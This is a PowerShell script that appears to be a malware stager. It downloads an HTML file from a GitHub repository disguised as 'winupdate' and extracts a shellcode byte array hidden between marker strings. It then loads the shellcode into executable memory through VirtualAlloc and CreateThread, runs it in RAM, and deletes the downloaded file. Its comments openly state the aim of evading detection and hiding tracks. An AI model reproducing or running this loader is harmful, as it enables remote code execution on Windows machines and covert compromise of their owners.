# 1. Paths and URLs
$htmlPath = "$env:TEMP\test.html" # Using TEMP is less suspicious than Downloads
$htmlUrl = "https://raw.githubusercontent.com/gwyn1869/winupdate/main/test.html"

# 2. Download the HTML Blob
Invoke-WebRequest -Uri $htmlUrl -OutFile $htmlPath -UseBasicParsing

# 3. Extract and Reassemble the Byte Array
$htmlContent = Get-Content $htmlPath -Raw
$pattern = '(?<=dmr)(.*?)(?=dmr)'
$match = [regex]::Match($htmlContent, $pattern).Value
$byteArray = $match.Split("dmr") | ForEach-Object { [byte]$_ }

# 4. The Shellcode Loader (Runs in RAM)
$kernel32 = Add-Type -MemberDefinition @"
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@ -Name "Win32" -Namespace Win32 -PassThru

# Allocate Memory (0x1000 = Commit, 0x2000 = Reserve | 0x40 = ExecuteReadWrite)
$size = [uint32]$byteArray.Length
$address = $kernel32::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)

# Copy Shellcode to Allocated Memory
[System.Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $address, $size)

# Execute the Shellcode as a new Thread
$kernel32::CreateThread([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# Cleanup the HTML file to hide tracks
Remove-Item $htmlPath -Force
